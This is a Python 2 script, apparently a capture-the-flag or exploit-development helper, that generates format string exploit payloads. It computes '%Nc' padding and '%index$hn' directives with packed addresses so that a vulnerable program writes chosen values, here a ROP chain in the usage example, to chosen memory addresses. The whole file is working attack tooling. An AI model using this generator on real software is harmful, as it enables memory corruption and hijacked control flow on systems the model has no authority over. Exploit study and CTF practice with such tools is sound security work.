#!/usr/bin/env python
#-*- coding:utf-8 -*-

import sys
import struct

#TODO: sometimes %xx$n is enough
#TODO: sometimes address is better when not aligned (e.g. to avoid null bytes)
#TODO: add word() class - to set shorts (dword by default)
#TODO: function to make patterns with fill up to N bytes to search argnumber
#TODO: @start_len param is for cases when you can't change the printed data
#      so there should be a param for the other case (padding in other words)

class FormatStr:
    def __init__(self):
        self.tuples = []
        self.mem = {}
        self.shorts = {}

    def __setitem__(self, addr, value):
        if type(addr) in (int, long):
            addr = addr & 0xffffffff
        elif type(addr) == str:
            addr = struct.unpack("<I", addr)[0]
        else:
            print type(addr)
            raise TypeError("address must be int or packed int")

        if type(value) in (int, long):
            value = value & 0xffffffff
            self._set_dword(addr, value)
        elif type(value) == str:
            while len(value):
                val = struct.unpack("<I", value[:4].ljust(4, "\x00"))[0]
                self._set_dword(addr, val)
                value = value[4:]
                addr += 4
        elif type(value) == list:
            while value:
                val = value[0]
                self._set_dword(addr, val)
                value = value[1:]
                addr += 4
        else:
            raise TypeError("value must be int or packed ints")
        return

    def __getitem__(self, addr):
        return self.mem[addr]

    def _set_dword(self, addr, value):
        self.mem[addr] = value

    def make_shorts(self):
        self.shorts = {}
        for addr in self.mem:
            self.shorts[addr] = self.mem[addr] & 0xffff
            self.shorts[addr + 2] = (self.mem[addr] & 0xffffffff) >> 16
        return self.shorts

    def sort(self):
        self.tuples = tuples_sorted_by_values(self.make_shorts())

    def payload(self, arg_index, start_len=0):
        self.sort()

        prev_len = -1
        index = arg_index * 10000  # enough for sure
        while True:
            payload = ""
            addrs = ""
            printed = start_len

            for addr, value in self.tuples:
                print_len = value - printed
                if print_len > 2:
                    payload += "%" + str(print_len) + "c"
                elif print_len >= 0:
                    payload += "A" * print_len
                else:
                    self.warning("Can't write a value %08x (too small)." % value)
                    continue

                payload += "%" + str(index) + "$hn"
                addrs += struct.pack("<I", addr)
                printed += print_len
                index += 1
            
            payload += "A" *  (-len(payload) % 4)  # align 4 bytes
            
            if len(payload) == prev_len:
                payload += addrs  # argnumbers are set right
                break

            prev_len = len(payload)
            index = arg_index + len(payload) // 4

        if "\x00" in payload:
            self.warning("Payload contains NULL bytes.")
        return payload
    
    def warning(self, s):
        print >>sys.stderr, "WARNING:", s

def tuples_sorted_by_values(adict):
    """Return list of (key, value) pairs of @adict sorted by values."""
    return sorted(adict.items(), lambda x, y: cmp(x[1], y[1]))

def main():
    # Usage example
    addr = 0x08049580
    rop = [0x080487af, 0x0804873c, 0x080488de]
    p = FormatStr()
    p[addr] = rop

    # buf is 14th argument, 4 bytes are already printed
    pay = p.payload(14, 4)
    sys.stdout.write(pay)


if __name__ == "__main__":
    main()
